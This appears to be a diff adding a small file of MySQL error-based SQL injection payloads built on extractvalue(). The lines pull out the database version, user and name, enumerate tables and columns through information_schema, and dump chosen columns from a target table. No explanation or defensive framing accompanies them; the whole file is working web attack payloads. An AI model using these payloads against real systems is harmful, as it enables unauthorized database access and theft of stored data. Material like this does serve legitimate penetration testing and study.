@@ -1,0 +1,6 @@
+  and extractvalue(rand(),concat(version()))—
+  and extractvalue(rand(),concat(user()))—
+  and extractvalue(rand(),concat(database()))—
+  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,table_name) from information_schema.tables limit N,1)))--
+  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,column_name) from information_schema.columns limit N,1)))--
+  and extractvalue(rand(),concat(0x3a,(select concat(0x3a,ColumnName1,0x3a,ColumnName2,0x3a,ColumnName3) from TableName)))--
